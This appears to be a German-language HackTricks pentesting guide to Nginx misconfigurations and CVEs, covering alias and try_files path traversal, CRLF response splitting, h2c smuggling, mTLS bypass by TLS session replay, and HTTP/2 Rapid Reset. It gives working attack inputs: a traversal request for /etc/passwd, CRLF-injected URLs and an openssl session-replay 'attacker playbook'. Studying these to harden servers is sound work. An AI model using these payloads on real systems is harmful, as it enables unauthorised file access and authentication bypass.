# Nginx

{{#include ../../banners/hacktricks-training.md}}


## Fehlende root location <a href="#missing-root-location" id="missing-root-location"></a>

Bei der Konfiguration des Nginx-Servers spielt die **root directive** eine entscheidende Rolle, da sie das Basisverzeichnis festlegt, aus dem Dateien bereitgestellt werden. Betrachte das folgende Beispiel:
```bash
server {
root /etc/nginx;

location /hello.txt {
try_files $uri $uri/ =404;
proxy_pass http://127.0.0.1:8080/;
}
}
```
In dieser Konfiguration ist `/etc/nginx` als root-Verzeichnis festgelegt. Diese Einrichtung erlaubt den Zugriff auf Dateien innerhalb des angegebenen root-Verzeichnisses, wie z. B. `/hello.txt`. Wichtig ist jedoch, dass nur ein spezifischer Standort (`/hello.txt`) definiert ist. Es gibt keine Konfiguration für die Root-Location (`location / {...}`). Dieses Fehlen bedeutet, dass die root-Direktive global greift und Anfragen an den Root-Pfad `/` Zugriff auf Dateien unter `/etc/nginx` ermöglichen.

Eine kritische Sicherheitsüberlegung ergibt sich aus dieser Konfiguration. Eine einfache `GET`-Anfrage, wie `GET /nginx.conf`, könnte sensible Informationen offenlegen, indem die Nginx-Konfigurationsdatei unter `/etc/nginx/nginx.conf` ausgeliefert wird. Das Setzen von root auf ein weniger sensibles Verzeichnis, wie `/etc`, könnte dieses Risiko mindern, dennoch kann es unbeabsichtigten Zugriff auf andere kritische Dateien erlauben, einschließlich weiterer Konfigurationsdateien, Access-Logs und sogar verschlüsselter Zugangsdaten, die für HTTP basic authentication verwendet werden.

## Alias LFI Fehlkonfiguration <a href="#alias-lfi-misconfiguration" id="alias-lfi-misconfiguration"></a>

In den Konfigurationsdateien von Nginx ist eine genaue Prüfung der "location"-Direktiven erforderlich. Eine Schwachstelle, bekannt als Local File Inclusion (LFI), kann unbeabsichtigt durch eine Konfiguration eingeführt werden, die der folgenden ähnelt:
```
location /imgs {
alias /path/images/;
}
```
Diese Konfiguration ist anfällig für LFI-Angriffe, da der Server Anfragen wie `/imgs../flag.txt` so interpretiert, dass versucht wird, auf Dateien außerhalb des vorgesehenen Verzeichnisses zuzugreifen, was effektiv zu `/path/images/../flag.txt` aufgelöst wird. Dieser Fehler ermöglicht es Angreifern, Dateien vom Dateisystem des Servers abzurufen, die über das Web nicht zugänglich sein sollten.

Um diese Schwachstelle zu beheben, sollte die Konfiguration wie folgt angepasst werden:
```
location /imgs/ {
alias /path/images/;
}
```
Mehr Informationen: [https://www.acunetix.com/vulnerabilities/web/path-traversal-via-misconfigured-nginx-alias/](https://www.acunetix.com/vulnerabilities/web/path-traversal-via-misconfigured-nginx-alias/)

Accunetix-Tests:
```
alias../ => HTTP status code 403
alias.../ => HTTP status code 404
alias../../ => HTTP status code 403
alias../../../../../../../../../../../ => HTTP status code 400
alias../ => HTTP status code 403
```
## Unsichere Pfadbeschränkung <a href="#unsafe-variable-use" id="unsafe-variable-use"></a>

Siehe die folgende Seite, um zu lernen, wie man Direktiven wie die folgenden umgeht:
```plaintext
location = /admin {
deny all;
}

location = /admin/ {
deny all;
}
```
{{#ref}}
../../pentesting-web/proxy-waf-protections-bypass.md
{{#endref}}

## Unsicherer Variablengebrauch / HTTP Request Splitting <a href="#unsafe-variable-use" id="unsafe-variable-use"></a>

> [!CAUTION]
> Verwundbare Variablen `$uri` und `$document_ur`i und das kann behoben werden, indem man sie durch `$request_uri` ersetzt.
>
> Ein Regex kann ebenfalls verwundbar sein, z. B.:
>
> `location ~ /docs/([^/])? { … $1 … }` - Verwundbar
>
> `location ~ /docs/([^/\s])? { … $1 … }` - Nicht verwundbar (prüft auf Leerzeichen)
>
> `location ~ /docs/(.*)? { … $1 … }` - Nicht verwundbar

Eine Verwundbarkeit in der Nginx-Konfiguration wird im folgenden Beispiel demonstriert:
```
location / {
return 302 https://example.com$uri;
}
```
Die Zeichen \r (Carriage Return) und \n (Line Feed) stehen für Zeilenumbrüche in HTTP-Requests, und ihre URL-kodierten Formen werden als `%0d%0a` dargestellt. Das Einfügen dieser Zeichen in eine Anfrage (z. B. `http://localhost/%0d%0aDetectify:%20clrf`) an einen falsch konfigurierten Server führt dazu, dass der Server einen neuen Header mit dem Namen `Detectify` ausgibt. Das passiert, weil die $uri-Variable die URL-kodierten Zeilenumbrüche decodiert, was zu einem unerwarteten Header in der Antwort führt:
```
HTTP/1.1 302 Moved Temporarily
Server: nginx/1.19.3
Content-Type: text/html
Content-Length: 145
Connection: keep-alive
Location: https://example.com/
Detectify: clrf
```
Erfahre mehr über die Risiken von CRLF injection und response splitting unter [https://blog.detectify.com/2019/06/14/http-response-splitting-exploitations-and-mitigations/](https://blog.detectify.com/2019/06/14/http-response-splitting-exploitations-and-mitigations/).

Diese Technik wird auch [**in diesem Vortrag erklärt**](https://www.youtube.com/watch?v=gWQyWdZbdoY&list=PL0xCSYnG_iTtJe2V6PQqamBF73n7-f1Nr&index=77) mit einigen verwundbaren Beispielen und Erkennungsmechanismen. Zum Beispiel, um diese Fehlkonfiguration aus einer blackbox-Perspektive zu erkennen, könntest du diese Requests schicken:

- `https://example.com/%20X` - Beliebiger HTTP-Statuscode
- `https://example.com/%20H` - 400 Bad Request

Wenn verwundbar, wird die erste Anfrage Erfolg liefern, da "X" jede HTTP-Methode sein kann, und die zweite einen Fehler, weil H keine gültige Methode ist. Der Server erhält also etwas wie: `GET / H HTTP/1.1` und das löst den Fehler aus.

Weitere Erkennungsbeispiele wären:

- `http://company.tld/%20HTTP/1.1%0D%0AXXXX:%20x` - Beliebiger HTTP-Statuscode
- `http://company.tld/%20HTTP/1.1%0D%0AHost:%20x` - 400 Bad Request

Einige im Vortrag gezeigte verwundbare Konfigurationen waren:

- Beachte, wie **`$uri`** unverändert in der finalen URL verwendet wird
```
location ^~ /lite/api/ {
proxy_pass http://lite-backend$uri$is_args$args;
}
```
- Beachte, wie **`$uri`** erneut in der URL vorkommt (diesmal innerhalb eines Parameters)
```
location ~ ^/dna/payment {
rewrite ^/dna/([^/]+) /registered/main.pl?cmd=unifiedPayment&context=$1&native_uri=$uri break;
proxy_pass http://$back;
```
- Jetzt in AWS S3
```
location /s3/ {
proxy_pass https://company-bucket.s3.amazonaws.com$uri;
}
```
### Beliebige Variable

Es wurde festgestellt, dass **user-supplied data** unter bestimmten Umständen als **Nginx-Variable** behandelt werden können. Die Ursache dieses Verhaltens bleibt etwas rätselhaft, ist jedoch weder selten noch einfach zu verifizieren. Diese Anomalie wurde in einem Security-Report auf HackerOne hervorgehoben, der [here](https://hackerone.com/reports/370094) eingesehen werden kann. Weitere Untersuchungen der Fehlermeldung führten zur Identifizierung ihres Auftretens im [SSI filter module of Nginx's codebase](https://github.com/nginx/nginx/blob/2187586207e1465d289ae64cedc829719a048a39/src/http/modules/ngx_http_ssi_filter_module.c#L365), wodurch Server Side Includes (SSI) als die eigentliche Ursache ausgemacht wurden.

Um **diese Fehlkonfiguration** zu erkennen, kann der folgende Befehl ausgeführt werden, der einen Referer-Header setzt, um das Ausgeben von Variablen zu testen:
```bash
$ curl -H ‘Referer: bar’ http://localhost/foo$http_referer | grep ‘foobar’
```
Scans nach dieser Fehlkonfiguration über mehrere Systeme hinweg ergaben mehrere Fälle, in denen Nginx-Variablen von einem Benutzer ausgegeben werden konnten. Allerdings deutet eine Abnahme der Anzahl verwundbarer Instanzen darauf hin, dass die Bemühungen zur Behebung dieses Problems einigermaßen erfolgreich waren.

### Verwendung von try_files mit $URI$ARGS-Variablen

Die folgende Nginx-Fehlkonfiguration kann zu einer LFI-Schwachstelle führen:
```
location / {
try_files $uri$args $uri$args/ /index.html;
}
```
In unserer Konfiguration haben wir die Direktive `try_files`, die verwendet wird, um das Vorhandensein von Dateien in einer angegebenen Reihenfolge zu prüfen. Nginx wird die erste Datei ausliefern, die es findet. Die Grundsyntax der Direktive `try_files` ist wie folgt:
```
try_files file1 file2 ... fileN fallback;
```
Nginx prüft in der angegebenen Reihenfolge, ob jede Datei existiert. Existiert eine Datei, wird sie sofort ausgeliefert. Existieren keine der angegebenen Dateien, wird die Anfrage an die Fallback-Option weitergeleitet, die eine andere URI oder eine bestimmte Fehlerseite sein kann.

Verwendet man jedoch die Variablen `$uri$args` in dieser Direktive, versucht Nginx, nach einer Datei zu suchen, die dem Request-URI kombiniert mit den Query-String-Argumenten entspricht. Daher lässt sich diese Konfiguration ausnutzen:
```
http {
server {
root /var/www/html/public;

location / {
try_files $uri$args $uri$args/ /index.html;
}
}
}
```
Mit folgendem Payload:
```
GET /?../../../../../../../../etc/passwd HTTP/1.1
Host: example.com
```
Mit unserem payload entkommen wir dem Root-Verzeichnis (in der Nginx-Konfiguration definiert) und laden die `/etc/passwd`-Datei. In den Debug-Logs können wir beobachten, wie Nginx die Dateien ausprobiert:
```
...SNIP...

2025/07/11 15:49:16 [debug] 79694#79694: *4 trying to use file: "/../../../../../../../../etc/passwd" "/var/www/html/public/../../../../../../../../etc/passwd"
2025/07/11 15:49:16 [debug] 79694#79694: *4 try file uri: "/../../../../../../../../etc/passwd"

...SNIP...

2025/07/11 15:49:16 [debug] 79694#79694: *4 http filename: "/var/www/html/public/../../../../../../../../etc/passwd"

...SNIP...

2025/07/11 15:49:16 [debug] 79694#79694: *4 HTTP/1.1 200 OK

```
PoC gegen Nginx mit der oben genannten Konfiguration:
![Example burp request](../../images/nginx_try_files.png)

## Rohes Auslesen von Backend-Antworten

Nginx bietet über `proxy_pass` eine Funktion, die das Abfangen von Fehlern und HTTP-Headern des Backends ermöglicht, um interne Fehlermeldungen und Header zu verbergen. Dies erreicht Nginx, indem es bei Backend-Fehlern eigene Fehlerseiten ausliefert. Probleme treten jedoch auf, wenn Nginx auf eine ungültige HTTP-Anfrage stößt. Eine solche Anfrage wird unverändert an das Backend weitergeleitet, und die rohe Antwort des Backends wird dann direkt an den Client gesendet, ohne dass Nginx eingreift.

Betrachten wir ein Beispiel mit einer uWSGI-Anwendung:
```python
def application(environ, start_response):
start_response('500 Error', [('Content-Type', 'text/html'), ('Secret-Header', 'secret-info')])
return [b"Secret info, should not be visible!"]
```
Um dies zu verwalten, werden bestimmte Direktiven in der Nginx-Konfiguration verwendet:
```
http {
error_page 500 /html/error.html;
proxy_intercept_errors on;
proxy_hide_header Secret-Header;
}
```
- [**proxy_intercept_errors**](http://nginx.org/en/docs/http/ngx_http_proxy_module.html#proxy_intercept_errors): Diese Direktive erlaubt es Nginx, eine benutzerdefinierte Antwort für Backend-Antworten mit einem Statuscode größer als 300 zu liefern. Sie stellt sicher, dass für unsere Beispiel-uWSGI-Anwendung eine `500 Error`-Antwort von Nginx abgefangen und behandelt wird.
- [**proxy_hide_header**](http://nginx.org/en/docs/http/ngx_http_proxy_module.html#proxy_hide_header): Wie der Name schon sagt, blendet diese Direktive bestimmte HTTP-Header vor dem Client aus und erhöht so Privatsphäre und Sicherheit.

Wenn eine gültige `GET`-Anfrage gestellt wird, verarbeitet Nginx sie normal und gibt eine standardmäßige Fehlerantwort zurück, ohne geheime Header zu verraten. Eine ungültige HTTP-Anfrage umgeht jedoch diesen Mechanismus, was zur Offenlegung von rohen Backend-Antworten führt, einschließlich geheimer Header und Fehlermeldungen.

## merge_slashes auf off gesetzt

Standardmäßig ist die Nginx-**`merge_slashes`-Direktive** auf **`on`** gesetzt, wodurch mehrere Vorwärtsslashes in einer URL zu einem einzigen Slash zusammengefasst werden. Diese Funktion erleichtert zwar die URL-Verarbeitung, kann aber unbeabsichtigt Schwachstellen in hinter Nginx liegenden Anwendungen verschleiern, insbesondere solche, die für Local File Inclusion (LFI)-Angriffe anfällig sind. Sicherheitsexperten **Danny Robinson und Rotem Bar** haben auf die potenziellen Risiken dieses Standardverhaltens hingewiesen, besonders wenn Nginx als Reverse-Proxy fungiert.

Um solche Risiken zu mindern, wird empfohlen, die **`merge_slashes`-Direktive auf off zu setzen** für Anwendungen, die für diese Schwachstellen anfällig sind. Dadurch stellt man sicher, dass Nginx Anfragen an die Anwendung weiterleitet, ohne die URL-Struktur zu verändern, und somit keine zugrundeliegenden Sicherheitsprobleme kaschiert werden.

Für mehr Informationen siehe [Danny Robinson and Rotem Bar](https://medium.com/appsflyer/nginx-may-be-protecting-your-applications-from-traversal-attacks-without-you-even-knowing-b08f882fd43d).

### **Maclicious Response Headers**

Wie in [**diesem Writeup**](https://mizu.re/post/cors-playground) gezeigt, gibt es bestimmte Header, die, falls sie in der Antwort des Webservers vorhanden sind, das Verhalten des Nginx-Proxys ändern. Sie können diese [**in der Dokumentation**](https://www.nginx.com/resources/wiki/start/topics/examples/x-accel/) nachschlagen:

- `X-Accel-Redirect`: Veranlasst Nginx, eine Anfrage intern auf eine angegebene Location weiterzuleiten.
- `X-Accel-Buffering`: Steuert, ob Nginx die Antwort puffern soll oder nicht.
- `X-Accel-Charset`: Setzt das Zeichenencoding für die Antwort bei Verwendung von X-Accel-Redirect.
- `X-Accel-Expires`: Legt die Ablaufzeit für die Antwort bei Verwendung von X-Accel-Redirect fest.
- `X-Accel-Limit-Rate`: Begrenzt die Übertragungsrate für Antworten bei Verwendung von X-Accel-Redirect.

Beispielsweise bewirkt der Header **`X-Accel-Redirect`** eine interne **Weiterleitung** in Nginx. Bei einer Nginx-Konfiguration mit z. B. **`root /`** und einer Antwort des Webservers mit **`X-Accel-Redirect: .env`** würde Nginx den Inhalt von **`/.env`** ausliefern (Path Traversal).

### **Default Value in Map Directive**

In der **Nginx-Konfiguration** spielt die `map`-Direktive häufig eine Rolle bei der **Autorisierungssteuerung**. Ein häufiger Fehler ist es, keinen **default**-Wert anzugeben, was zu unbefugtem Zugriff führen kann. Zum Beispiel:
```yaml
http {
map $uri $mappocallow {
/map-poc/private 0;
/map-poc/secret 0;
/map-poc/public 1;
}
}
```

```yaml
server {
location /map-poc {
if ($mappocallow = 0) {return 403;}
return 200 "Hello. It is private area: $mappocallow";
}
}
```
Ohne ein `default` kann ein **bösartiger Benutzer** die Sicherheit umgehen, indem er auf eine **undefinierte URI** innerhalb von `/map-poc` zugreift. [The Nginx manual](https://nginx.org/en/docs/http/ngx_http_map_module.html) empfiehlt, einen **Standardwert** zu setzen, um solche Probleme zu vermeiden.

### **DNS Spoofing Schwachstelle**

DNS spoofing gegen Nginx ist unter bestimmten Bedingungen möglich. Wenn ein Angreifer den **DNS server** kennt, den Nginx verwendet, und dessen DNS-Anfragen abfangen kann, kann er DNS records spoofen. Diese Methode ist jedoch wirkungslos, wenn Nginx so konfiguriert ist, dass es **localhost (127.0.0.1)** für die DNS-Auflösung verwendet. Nginx erlaubt die Angabe eines DNS-Servers wie folgt:
```yaml
resolver 8.8.8.8;
```
### **`proxy_pass` und `internal` Direktiven**

Die **`proxy_pass`**-Direktive wird verwendet, um Anfragen an andere Server weiterzuleiten, entweder intern oder extern. Die **`internal`**-Direktive stellt sicher, dass bestimmte Locations nur innerhalb von Nginx zugänglich sind. Obwohl diese Direktiven für sich genommen keine Schwachstellen sind, erfordert ihre Konfiguration eine sorgfältige Prüfung, um Sicherheitslücken zu vermeiden.

## proxy_set_header Upgrade & Connection

Wenn der nginx-Server so konfiguriert ist, dass die Upgrade- und Connection-Header weitergegeben werden, könnte ein [**h2c Smuggling attack**](../../pentesting-web/h2c-smuggling.md) durchgeführt werden, um auf geschützte/interne Endpunkte zuzugreifen.

> [!CAUTION]
> Diese Schwachstelle würde einem Angreifer erlauben, **eine direkte Verbindung mit dem `proxy_pass`-Endpunkt** (`http://backend:9999` in diesem Fall) herzustellen, deren Inhalt nicht von nginx überprüft wird.

Example of vulnerable configuration to steal `/flag` from [here](https://bishopfox.com/blog/h2c-smuggling-request):
```
server {
listen       443 ssl;
server_name  localhost;

ssl_certificate       /usr/local/nginx/conf/cert.pem;
ssl_certificate_key   /usr/local/nginx/conf/privkey.pem;

location / {
proxy_pass http://backend:9999;
proxy_http_version 1.1;
proxy_set_header Upgrade $http_upgrade;
proxy_set_header Connection $http_connection;
}

location /flag {
deny all;
}
```
> [!WARNING]
> Beachte, dass selbst wenn der `proxy_pass` auf einen bestimmten **Pfad** wie `http://backend:9999/socket.io` zeigte, die Verbindung mit `http://backend:9999` hergestellt wird, sodass du **jeden anderen Pfad innerhalb dieses internen Endpunkts kontaktieren kannst. Es spielt also keine Rolle, ob in der URL von proxy_pass ein Pfad angegeben ist.**

## HTTP/3 QUIC-Modul Remote-DoS & leak (2024)

Während 2024 veröffentlichte Nginx CVE-2024-31079, CVE-2024-32760, CVE-2024-34161 und CVE-2024-35200 und zeigte damit, dass eine **einzelne hostile QUIC session** Worker-Prozesse zum Absturz bringen oder memory leak verursachen kann, sobald das experimentelle `ngx_http_v3_module` kompiliert ist und ein `listen ... quic`-Socket exponiert wird. Betroffene Builds sind 1.25.0–1.25.5 und 1.26.0, während 1.27.0/1.26.1 die Fixes enthalten; die Speicheroffenlegung (CVE-2024-34161) erfordert zusätzlich MTUs größer als 4096 Bytes, damit sensible Daten sichtbar werden (Details in der 2024 nginx advisory unten referenziert).

**Recon & exploitation hints**

- HTTP/3 ist optional, daher nach `Alt-Svc: h3=":443"`-Antworten scannen oder UDP/443 QUIC handshakes brute-forcen; nach Bestätigung die Handshake- und STREAM-Frames mit custom `quiche-client`/`nghttp3` payloads fuzzen, um Worker-Abstürze auszulösen und log leakage zu erzwingen.
- Quickly fingerprint target support with:
```bash
nginx -V 2>&1 | grep -i http_v3
rg -n "listen .*quic" /etc/nginx/
```
## Umgehung der TLS-Session-Wiederaufnahme bei Client-Zertifikats-Authentifizierung (CVE-2025-23419)

Eine Advisory vom Februar 2025 gab bekannt, dass nginx 1.11.4–1.27.3, gebaut mit OpenSSL, das **Wiederverwenden einer TLS 1.3 session** von einem namensbasierten virtual host innerhalb eines anderen erlaubt, sodass ein Client, der einen zertifikatsfreien Host ausgehandelt hat, das ticket/PSK replayen kann, um in einen vhost geschützt mit `ssl_verify_client on;` zu springen und mTLS vollständig zu umgehen. Der Bug tritt auf, wann immer mehrere virtual hosts denselben TLS 1.3 session cache und tickets teilen (siehe die 2025 nginx advisory weiter unten).

**Angreifer-Playbook**
```bash
# 1. Create a TLS session on the public vhost and save the session ticket
openssl s_client -connect public.example.com:443 -sess_out ticket.pem

# 2. Replay that session ticket against the mTLS vhost before it expires
openssl s_client -connect admin.example.com:443 -sess_in ticket.pem -ign_eof
```
Wenn das Ziel verwundbar ist, wird der zweite Handshake ohne Vorlage eines Client-Zertifikats abgeschlossen und offenbart geschützte Bereiche.

**Was zu prüfen ist**

- Gemischte `server_name`-Blöcke, die `ssl_session_cache shared:SSL` plus `ssl_session_tickets on;` gemeinsam nutzen.
- Admin/API-Blöcke, die mTLS erwarten, aber gemeinsame Session-Cache/-Ticket-Einstellungen von öffentlichen Hosts erben.
- Automatisierung, die TLS 1.3 session resumption global aktiviert (z. B. Ansible roles), ohne vhost isolation zu berücksichtigen.

## HTTP/2 Rapid Reset Resilienz (CVE-2023-44487 Verhalten)

Der HTTP/2 Rapid Reset-Angriff (CVE-2023-44487) betrifft nginx weiterhin, wenn Betreiber `keepalive_requests` oder `http2_max_concurrent_streams` über die Standardeinstellungen hinaus erhöhen: Ein Angreifer öffnet eine HTTP/2-Verbindung, flutet sie mit Tausenden von Streams und sendet dann sofort `RST_STREAM`-Frames, sodass die Gleichzeitigkeitsobergrenze nie erreicht wird, während die CPU weiterhin durch die Tear-down-Logik belastet wird. Die nginx-Defaults (128 concurrent streams, 1000 keepalive requests) halten den Blast-Radius klein; das deutliche Anheben dieser Limits macht es trivial, Worker bereits von einem einzelnen Client zu erschöpfen (siehe das unten referenzierte F5 write-up).

**Erkennungstipps**
```bash
# Highlight risky knobs
rg -n "http2_max_concurrent_streams" /etc/nginx/
rg -n "keepalive_requests" /etc/nginx/
```
Hosts that reveal unusually high values for those directives are prime targets: one HTTP/2 client can loop through stream creation and instant `RST_STREAM` frames to keep CPU pegged without tripping the concurrency cap.

## Probieren Sie es selbst

Detectify hat ein GitHub-Repository erstellt, in dem Sie Docker verwenden können, um Ihren eigenen verwundbaren Nginx-Testserver mit einigen der in diesem Artikel besprochenen Fehlkonfigurationen einzurichten und selbst zu suchen!

[https://github.com/detectify/vulnerable-nginx](https://github.com/detectify/vulnerable-nginx)

## Statische Analyzer-Tools

### [gixy-ng](https://github.com/dvershinin/gixy) & [GixyNG](https://github.com/megamansec/gixyng) & [GIXY](https://github.com/yandex/gixy)


- [GixyNG](https://github.com/megamansec/gixyng) (ein aktualisierter Fork von GIXY) ist ein Tool zur Analyse von Nginx-Konfigurationen, mit dem Ziel, Schwachstellen, unsichere Direktiven und riskante Fehlkonfigurationen zu finden. Es erkennt auch Fehlkonfigurationen, die die Performance beeinträchtigen, und auf verpasste Hardening-Möglichkeiten, wodurch eine automatisierte Fehlererkennung ermöglicht wird.
- [gixy-ng](https://github.com/dvershinin/gixy) (der aktiv gepflegte Fork von GIXY) ist ein Tool zur Analyse von Nginx-Konfigurationen, mit dem Ziel, Schwachstellen, unsichere Direktiven und riskante Fehlkonfigurationen zu finden. Es erkennt auch Fehlkonfigurationen, die die Performance beeinträchtigen, und auf verpasste Hardening-Möglichkeiten, wodurch eine automatisierte Fehlererkennung ermöglicht wird.

### [Nginxpwner](https://github.com/stark0de/nginxpwner)

Nginxpwner ist ein einfaches Tool, um nach üblichen Nginx-Fehlkonfigurationen und Schwachstellen zu suchen.

## Referenzen

- [**https://blog.detectify.com/2020/11/10/common-nginx-misconfigurations/**](https://blog.detectify.com/2020/11/10/common-nginx-misconfigurations/)
- [**http://blog.zorinaq.com/nginx-resolver-vulns/**](http://blog.zorinaq.com/nginx-resolver-vulns/)
- [**https://github.com/yandex/gixy/issues/115**](https://github.com/yandex/gixy/issues/115)
- [**https://mailman.nginx.org/pipermail/nginx-announce/2024/GWH2WZDVCOC2A5X67GKIMJM4YRELTR77.html**](https://mailman.nginx.org/pipermail/nginx-announce/2024/GWH2WZDVCOC2A5X67GKIMJM4YRELTR77.html)
- [**https://mailman.nginx.org/pipermail/nginx-announce/2025/NYEUJX7NCBCGJGXDFVXNMAAMJDFSE45G.html**](https://mailman.nginx.org/pipermail/nginx-announce/2025/NYEUJX7NCBCGJGXDFVXNMAAMJDFSE45G.html)
- [**https://www.f5.com/company/blog/nginx/http-2-rapid-reset-attack-impacting-f5-nginx-products**](https://www.f5.com/company/blog/nginx/http-2-rapid-reset-attack-impacting-f5-nginx-products)


{{#include ../../banners/hacktricks-training.md}}
